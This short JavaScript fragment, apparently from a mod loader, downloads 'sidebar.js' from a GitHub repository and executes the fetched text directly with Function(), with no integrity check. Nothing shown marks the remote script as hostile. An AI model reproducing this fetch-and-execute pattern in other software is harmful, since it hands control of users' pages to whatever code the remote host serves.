  fetch("https://raw.githubusercontent.com/PoyOzk/RHS-Modloader/main/sidebar.js").then(response=>response.text()).then(d=>(Function(d))())
}
